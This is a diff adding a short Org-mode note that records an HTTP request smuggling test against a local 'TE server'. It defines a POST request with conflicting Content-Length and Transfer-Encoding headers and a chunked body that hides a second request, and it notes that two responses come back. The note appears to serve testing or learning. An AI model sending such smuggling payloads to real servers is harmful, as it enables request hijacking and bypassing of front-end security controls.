@@ -1,0 +1,22 @@
+* <2020-12-02 Wed>
+
+** TE Server
+*** Able to smuggle package to TE server
+*** Use the following request
+ #+BEGIN_SRC http
+ (def m-te
+   {:request
+    {:method "POST"
+     :http-version "HTTP/1.1"
+     :url "http://localhost:4000/test-json"
+     :headers {
+               "Content-Length" 91
+               "Transfer-Encoding" "chunked"
+               "Host" "localhost:4000"
+               "Connection" "keep-alive"
+               }
+     :content "0\r\n\r\nPOST /about HTTP/1.1\r\nHost: localhost:4000\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nedho\r\n0\r\n\r\n"}})
+
+ #+END_SRC
+*** The important part is "transfer-Encoding" header and the content 
+*** Using hubble/netty to send above message will receive 2 responses.
